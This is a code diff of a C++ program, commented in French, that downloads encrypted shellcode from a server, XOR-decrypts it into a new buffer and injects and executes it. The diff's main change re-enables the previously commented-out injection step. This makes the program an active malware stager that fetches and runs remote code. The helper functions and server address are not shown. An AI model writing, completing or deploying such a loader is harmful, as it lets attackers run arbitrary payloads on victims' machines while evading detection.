@@ -10,6 +10,7 @@ int main() {
 
     char* encrypted_shellcode = nullptr; // Stocke le shellcode chiffré
     size_t shellcode_size = 436;           // Taille du shellcode téléchargé
+    char* decrypted_shellcode = new char[shellcode_size-3]; // Le reste du shellcode chiffré
 
     // Étape 1 : Télécharger le shellcode chiffré depuis le serveur
     if (!download_shellcode(server_url, &encrypted_shellcode, &shellcode_size)) {
@@ -17,17 +18,16 @@ int main() {
     }
 
     // Étape 2 : Déchiffrer le shellcode (utilisation d'un XOR simple)
-    decrypt_shellcode(encrypted_shellcode, shellcode_size-3);
+    decrypt_shellcode(encrypted_shellcode, decrypted_shellcode, shellcode_size-3);
 
-    test_shellcode(encrypted_shellcode, shellcode_size-3);
+    // test_shellcode(decryptedShellcode, shellcode_size-3);
 
-    //// Étape 3 : Injecter et exécuter le shellcode
-    //if (!inject_shellcode(encrypted_shellcode, shellcode_size-3)) {
-    //    delete[] encrypted_shellcode; // Libération de la mémoire
-    //    return -2; // Erreur lors de l'injection
-    //}
+    // Étape 3 : Injecter et exécuter le shellcode
+    if (!inject_shellcode(decrypted_shellcode, shellcode_size-3)) {
+        delete[] decrypted_shellcode; // Libération de la mémoire
+        delete[] encrypted_shellcode; // Libération de la mémoire
+        return -2; // Erreur lors de l'injection
+    }
 
-    // Libérer la mémoire allouée
-    delete[] encrypted_shellcode;
     return 0; // Fin du programme
 }
